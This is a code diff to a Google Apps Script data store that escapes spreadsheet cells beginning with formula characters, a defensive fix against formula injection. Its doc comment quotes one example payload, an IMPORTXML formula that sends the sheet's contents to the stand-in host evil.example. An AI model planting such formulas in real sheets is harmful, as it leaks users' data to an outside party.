@@ -9,6 +9,32 @@
 
 var SPREADSHEET_ID_KEY = 'SPREADSHEET_ID';
 
+/** Leading characters that make Sheets parse a cell as a formula. */
+var FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+/**
+ * Escapes strings that Sheets would otherwise evaluate as formulas.
+ *
+ * setValues() parses a leading '=' exactly like typing into the cell does, so a
+ * note reading `=IMPORTXML("https://evil.example?d="&JOIN(",",A:Z),"//a")` would
+ * exfiltrate the sheet the moment its owner opened it. Prefixing an apostrophe
+ * pins the cell to text; Sheets treats that apostrophe as formatting rather than
+ * content and drops it again on read, so values round-trip unchanged.
+ *
+ * Applied to whole row arrays because storeUpdateRowsByKey writes back rows it
+ * only read, which would otherwise turn stored text back into live formulas.
+ *
+ * @param {unknown[][]} rows
+ * @returns {unknown[][]}
+ */
+function sanitizeRows_(rows) {
+  return rows.map(function (row) {
+    return row.map(function (value) {
+      return typeof value === 'string' && FORMULA_LEAD.test(value) ? "'" + value : value;
+    });
+  });
+}
+
 /**
  * Returns the spreadsheet holding the data, resolved from script properties.
  * @returns {GoogleAppsScript.Spreadsheet.Spreadsheet}
@@ -65,7 +91,7 @@ function storeAppendRows(tableName, objects) {
   var sheet = getSheet_(tableName);
   var rows = objects.map(function (obj) { return objectToRow(tableName, obj); });
   sheet.getRange(sheet.getLastRow() + 1, 1, rows.length, SCHEMA[tableName].length)
-    .setValues(rows);
+    .setValues(sanitizeRows_(rows));
 }
 
 /**
@@ -95,7 +121,7 @@ function storeUpdateRowsByKey(tableName, keyColumn, updatesByKey) {
       updated++;
     }
   }
-  if (updated) range.setValues(values);
+  if (updated) range.setValues(sanitizeRows_(values));
   return updated;
 }
 
